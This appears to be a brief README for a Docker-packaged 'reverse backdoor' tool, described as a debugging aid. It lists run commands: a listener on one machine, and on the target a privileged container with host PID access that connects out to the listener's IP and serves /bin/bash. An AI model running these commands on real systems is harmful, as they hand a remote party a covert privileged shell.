# Disclaimer

I'm not responsible for anything you do with this tool.

# Backdoor + Accomplice

This is the source code for a reverse backdoor tool that I use for debugging.
Useful when the machine to access cannot listen on the internet.

# Usage

## On machine A that can listen on a port open to the internet

```bash
$ docker run -it --rm --net host tiborvass/backdoor-accomplice 0.0.0.0:1234
```

## On machine B that you want to backdoor

```bash
$ docker run -dit --pid host --privileged tiborvass/backdoor $MACHINE_A_IP:1234 /bin/bash
```

# Building

## Accomplice

```
docker build --target accomplice .
```

## Backdoor

```
docker build --target backdoor .
```
